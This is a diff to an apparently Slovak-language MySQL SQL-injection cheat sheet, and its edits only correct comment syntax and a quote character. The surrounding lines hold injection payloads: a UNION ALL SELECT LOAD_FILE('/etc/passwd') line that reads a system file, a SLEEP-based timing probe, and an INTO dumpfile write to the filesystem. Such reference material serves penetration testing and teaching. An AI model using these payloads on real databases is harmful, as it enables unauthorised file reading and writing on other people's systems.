@@ -142,8 +142,9 @@ SELECT 6 & 1; # returns 0
 ### ASCII hodnota (ASCII Value -> Char)
 ```sql
 -- ASCII hodnota (ASCII Value -> Char)	
-SELECT char(65); # returns A
-Char -> ASCII Value	SELECT ascii('A'); # returns 65
+SELECT char(65); # returns A  
+-- Char -> ASCII Value	  
+SELECT ascii('A'); # returns 65   
 ```
 
 ### Pretypovanie (Casting)
@@ -195,7 +196,7 @@ SELECT SLEEP(5); # >= 5.0.12
 ### Prístup k lokálnemu súboru (Local File Access)	
 ```sql
 -- Prístup k lokálnemu súboru (Local File Access)	
-…’ UNION ALL SELECT LOAD_FILE('/etc/passwd') --  priv, can only read world-readable files
+…' UNION ALL SELECT LOAD_FILE('/etc/passwd') --  priv, can only read world-readable files
 SELECT * FROM mytable INTO dumpfile '/tmp/somefile'; --  priv, write to file system
 ```
 
